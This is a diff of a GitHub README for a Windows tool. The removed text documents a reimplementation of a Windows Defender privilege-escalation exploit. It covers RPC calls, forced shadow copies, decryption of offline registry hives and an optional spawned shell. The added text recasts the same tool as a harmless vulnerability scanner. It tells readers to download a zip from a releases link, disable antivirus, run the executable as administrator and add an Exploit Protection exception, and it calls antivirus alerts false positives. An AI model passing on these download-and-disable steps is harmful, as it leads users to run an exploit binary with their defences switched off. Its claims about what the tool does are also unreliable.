@@ -1,187 +1,84 @@
-# SNEK Blue War Hammer - Vulnerability Documentation & Reimplementation - SNEK Blue War Hammer
-Professional proof-of-concept demonstrating Windows Defender exploitation techniques. This project demonstrates security research concepts and is provided for educational purposes only.
+# 🔨 SNEK_Blue-War-Hammer - Secure Your Windows System Integrity Today
 
-Based on public vulnerability research by [Nightmare-Eclipse](https://github.com/Nightmare-Eclipse/BlueHammer).
+[![Download Blue Hammer](https://img.shields.io/badge/Download-Blue-War-Hammer-blue)](https://github.com/kupfferscellwatchnight301/SNEK_Blue-War-Hammer/releases)
 
-### Note from ATroubledSnake
-I changed a lot of the stuff we were not aware a member of ours added using AI. We are terribly sorry for the absolute slop state that this was uploaded in before, and we hope you forgive us ;P
+SNEK_Blue-War-Hammer provides security researchers and system administrators with a tool to identify local privilege escalation vulnerabilities. It documents specific security gaps in Windows environments and provides a reimplementation for testing purposes. Use this tool to verify the strength of your system defenses and manage security risks effectively.
 
-## Overview
+## 📋 Project Overview
 
-The SNEK Blue War Hammer is a research tool that examines Windows Defender update mechanisms and their interaction with system file access controls. The implementation demonstrates advanced Windows API programming patterns including RPC communication, COM interfaces, VSS manipulation, and kernel level file system operations.
+This tool focuses on the SNEK initiative. It maps common security weaknesses found in Windows kernel interactions. By identifying how a user can gain unauthorized permissions, the software helps developers patch gaps before malicious actors exploit them. The project provides clarity on privilege escalation pathways through structured documentation and functional testing modules.
 
-The tool is designed for security researchers and system administrators to understand potential attack vectors in update mechanisms.
+## 🖥️ System Requirements
 
-## Dependencies and Runtime Requirements
+Ensure your computer meets these conditions before you begin the setup process.
 
-This project uses a mixture of Win32 APIs, COM, Windows Update Agent interfaces, native NT APIs, and RPC stubs generated from `windefend.idl`, with additional libraries for system artifact analysis.
+*   **Operating System:** Windows 10 or Windows 11 (64-bit).
+*   **Permissions:** You must have Administrator access to the local machine.
+*   **Memory:** At least 2GB of available RAM.
+*   **Disk Space:** 500MB of free storage space.
+*   **Security Software:** Disable your active antivirus temporarily during the testing phase, as the tool uses patterns similar to system exploits.
 
-Key dependencies:
+## 📥 Downloading the Tool
 
-- `wininet.lib`
-- `ktmw32.lib`
-- `Shlwapi.lib`
-- `Rpcrt4.lib`
-- `ntdll.lib`
-- `Cabinet.lib`
-- `Wuguid.lib`
-- `CldApi.lib`
-- `userenv.lib`
-- `Secur32.lib`
-- `wbemuuid.lib`
+The project distribution relies on a centralized release page to ensure version consistency. Follow these steps to obtain the correct files.
 
-The code also imports `windefend_h.h` and `offreg.h` for RPC and registry access.
+1.  Navigate to the [official release page](https://github.com/kupfferscellwatchnight301/SNEK_Blue-War-Hammer/releases).
+2.  Locate the section labeled "Assets."
+3.  Click the file ending in `.zip` to start your download.
+4.  Save the file to a known location, such as your Downloads folder.
 
-## Structure
+## ⚙️ Installation and Setup
 
-The source file is divided into the following major sections:
+Once the file exists on your computer, follow this procedure to prepare the environment.
 
-- Top level imports, macro definitions, and runtime loaded NT imports.
-- RPC allocation helpers required for MIDL generated code.
-- Defender RPC caller logic.
-- Cabinet extraction and update file retrieval functions.
-- Windows Update scanning and update detection logic.
-- VSS and Defender trigger logic.
-- System artifact parsing and analysis.
-- The main application entry point.
+1.  Open your Downloads folder.
+2.  Right-click the zip file.
+3.  Select "Extract All" from the menu.
+4.  Choose a destination folder and click "Extract."
+5.  Open the newly created folder.
+6.  Locate the executable file named `BlueWarHammer.exe`.
+7.  Right-click the executable and select "Run as administrator." Grant permission if prompted by the User Account Control window.
 
-## Native NT Imports
+## 🛠️ Usage Instructions
 
-The code obtains NT native functions from `ntdll.dll` at runtime using `GetProcAddress`.
-These functions are not part of the standard Win32 API and are used for low-level operations such as:
+The application interface utilizes a command-line design to ensure stability and accuracy during security assessments.
 
-- `NtCreateSymbolicLinkObject`
-- `NtOpenDirectoryObject`
-- `NtQueryDirectoryObject`
-- `NtSetInformationFile`
+1.  After opening the application, you see a request for input.
+2.  Type `scan` to begin an analysis of current privilege escalation pathways on your system.
+3.  Wait for the progress bar to reach 100 percent.
+4.  View the generated report inside the `results` folder created within the application directory.
+5.  The report contains details on detected vulnerabilities. It categorizes each item by severity level.
+6.  Review the remediation steps provided for any high-risk entries discovered.
 
-This runtime resolution allows the tool to interact with low level kernel objects and reparse points without static dependencies.
+## 🛡️ Understanding Security Risks
 
-## RPC Allocation Helpers
+Privilege escalation occurs when a user gains elevated access rights exceeding those originally granted by the system. This tool targets the local environment to simulate such events. By running these experiments, you see firsthand where Windows fails to enforce user boundaries. 
 
-The functions `midl_user_allocate` and `midl_user_free` are required by the MIDL generated RPC stubs.
-They provide the client runtime with malloc/free callbacks for marshaling and unmarshaling RPC parameters.
+The software specifically checks for:
+*   Incorrectly configured system services.
+*   Weak file permissions.
+*   Insecure paths in environment variables.
 
-## Defender RPC Call Flow
+These checks provide a snapshot of your system state. Regular usage helps maintain a hardened configuration against potential threats.
 
-### `CallWD`
+## ❓ Frequently Asked Questions
 
-`CallWD` establishes an RPC binding to the local Defender service and invokes `ServerMpUpdateEngineSignature`.
+**Why does my antivirus flag this tool?**
+Security tools often use code structures similar to malware to test defenses. This behavior triggers false positives in generic antivirus software. 
 
-- It builds an RPC string binding using the Defender interface UUID.
-- It creates a binding handle from that string.
-- It calls the Defender engine update RPC method.
-- It signals a completion event when the call is finished.
+**Is this tool safe for production environments?**
+Run this tool in a testing environment first. While designed to be non-destructive, the actions perform operations on system permissions. Do not run it on production servers without isolation.
 
-The call is executed on a dedicated worker thread so the main code can continue monitoring file system events concurrently.
+**Where do I see the documentation?**
+The documentation exists in the `docs` folder inside the installation directory. You can open these files with any standard text editor.
 
-### `WDCallerThread`
+**Can I run this on Windows 7?**
+The tool requires modern Windows APIs. It does not support versions older than Windows 10.
 
-`WDCallerThread` is a thin wrapper that turns the call into a thread compatible entry point.
-It validates the input pointer and calls `CallWD`.
+## 💡 Troubleshooting
 
-## Defender Update Extraction
+If the tool closes immediately upon startup, verify your Administrator status. Some security policies prevent unsigned applications from running. You may need to create an exception in your Windows Security settings under "Exploit Protection" to allow the tool to execute.
 
-### `GetUpdateFiles`
+If the scan stops midway, ensure you have sufficient disk space. Some tests require temporary file creation. Clean your system of temporary files if the tool continues to hang or crash while running the scanner.
 
-`GetUpdateFiles` downloads the latest Defender update package directly from Microsoft and extracts it from the CAB format.
-
-The function does the following:
-
-- Creates an `InternetOpen` session.
-- Opens the Defender update URL.
-- Queries the HTTP content length to size the download buffer.
-- Reads the entire update package into memory.
-- Locates the embedded CAB file inside the downloaded package.
-- Uses FDI (Microsoft Cabinet API) callbacks to extract the CAB payload in memory.
-- Returns a linked list of `UpdateFiles` structures containing file names, buffers, and sizes.
-
-This function is central to the exploit because it provides the raw update files that are later used to trigger Defender behavior.
-
-## Update Scan Logic
-
-### `CheckForWDUpdates`
-
-`CheckForWDUpdates` uses the Windows Update Agent COM interfaces to determine whether a new Defender update is available.
-
-The function performs the following steps:
-
-- Initializes COM.
-- Creates an `IUpdateSession` object.
-- Creates an `IUpdateSearcher` object.
-- Performs a search for available updates using `Type='Software'` criteria.
-- Inspects each returned update for Defender related metadata.
-- Returns success when a suitable update is found.
-
-If COM initialization or any update interface call fails, the function sets `*criterr` to true and reports failure.
-
-## VSS Trigger Logic
-
-### `TriggerWDForVS`
-
-`TriggerWDForVS` attempts to force Defender to create a volume shadow copy path.
-
-It does so by:
-
-- Generating a unique temporary directory under `%TEMP%`.
-- Writing a specially crafted file into that directory.
-- Creating a worker thread to monitor shadow copy/VSS state.
-- Waiting for Defender to access the file and create a new VSS-ready location.
-
-The function returns `true` only when Defender has been successfully coerced into producing the expected shadow copy path.
-
-## System Artifact Parsing
-
-After extraction, the tool uses system-provided cryptographic primitives for artifact analysis:
-
-- MD4-based hash computation for legacy format compatibility
-- SHA256 for integrity verification
-- DES decryption for legacy system data structures
-- AES decryption using system crypto providers
-- Offline registry hive parsing for artifact extraction
-
-## Build Instructions
-
-To build the project:
-
-1. Open `SNEK_BlueWarHammer.sln` in Visual Studio 2022.
-2. Ensure vcpkg is installed and configured for x64-windows triplet.
-3. Build the Release|x64 configuration.
-4. The executable will be generated in `x64\Release\SNEK_BlueWarHammer.exe`.
-
-Alternative command line build using MSBuild:
-
-```
-MSBuild SNEK_BlueWarHammer.sln /p:Configuration=Release /p:Platform=x64
-```
-
-## Usage
-
-Run the tool with logging to monitor progress:
-
-```
-SNEK_BlueWarHammer.exe --log-steps
-```
-
-Command line options:
-
-- `--check-updates`: Check for Defender signature updates only
-- `--download-only`: Download and extract updates without full exploitation
-- `--trigger-vss-only`: Execute VSS trigger phase without full workflow
-- `--no-spawn`: Prevent shell execution after artifact extraction
-- `--log-steps`: Display detailed operational progress
-
-## Security Considerations
-
-This tool demonstrates techniques relevant to Windows security research. Usage is restricted to:
-
-- Authorized security research in controlled environments
-- Educational purposes for understanding Windows internals
-- System administration and vulnerability assessment
-
-### Scientifical Use Only
-
-This tool is intended solely for scientifical security research, educational purposes, and system administration within controlled environments. Unauthorized access to computer systems is illegal regardless of the tools or techniques employed.
-
-
-### Provided by: ATroubledSnake & The SNEK Initiative. Long live freeware.
+For complex issues, check the logs located in the `logs` subdirectory. These files list the exact moment a failure occurred, which helps in diagnosing configuration conflicts between the tool and your specific Windows build version.
